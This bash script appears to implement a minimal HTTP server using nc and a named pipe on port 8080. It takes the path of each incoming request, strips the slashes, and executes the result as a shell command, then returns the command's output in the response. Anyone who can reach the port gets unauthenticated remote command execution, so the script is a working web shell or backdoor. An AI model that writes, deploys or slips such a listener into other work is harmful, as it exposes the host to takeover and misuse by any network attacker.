#!/bin/bash

PORT=8080

stop_server() {
  echo "Stopping server..."
  exit
}

trap stop_server SIGINT

handle_request() {
  while read -r line; do
    trline=`echo "$line" | tr -d '[\r\n]'`
    [ -z "$trline" ] && break
    (echo "$trline" | grep -Eq '(.*?)\s(.*?)\sHTTP.*?') && REQUEST=$(echo $trline | sed 's/\///g' | awk '{print $2}')
  done
  
  if check_comand=`$REQUEST 2>&1`; then
    output=$check_comand
    HTTP_RESPONSE_CODE="HTTP/1.1 200 OK"
  else
    output=`echo $check_comand | sed 's/.\/2.sh: line 19: //g'`
    HTTP_RESPONSE_CODE="HTTP/1.1 404 Not Found"
  fi
  
  content_length=$(echo $output | wc -c)
  RESPONSE="$HTTP_RESPONSE_CODE\r\nContent-Type: text/plain\r\nContent-Length: $content_length\r\n\r\n$output"
  echo -e $RESPONSE > response
}

rm -f response
mkfifo response

while :; do
  cat response | nc -lp $PORT | handle_request
done
